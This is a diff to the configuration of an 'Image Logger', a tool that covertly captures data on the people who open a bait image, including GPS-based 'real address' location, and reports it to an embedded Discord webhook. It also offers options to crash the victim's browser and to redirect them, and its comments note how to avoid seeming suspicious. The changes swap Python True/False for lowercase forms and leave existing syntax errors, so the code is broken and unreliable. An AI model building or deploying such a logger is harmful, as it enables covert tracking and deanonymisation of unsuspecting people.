@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1574228832867582104/dI4yoMmyxYjmcWGIwyQqGqs4np2zVaJEoqmSu6Az8Qz6FU8X8aXfXVSLRD0euaZGn4sK",
     "image": "https://preview.redd.it/wheres-my-trans-femboy-memes-v0-etwa1slt0z0a1.jpg?width=1080&crop=smart&auto=webp&s=5996a84200b0626f1b880342f4a9e5183723356c", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": true, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser" false, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": true, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False # Redirect to a webpage?
+        "redirect": false # Redirect to a webpage?
         "page": "https://bio.site/AlisaKujou" # Link to the webpage to redirect to 
     },
 
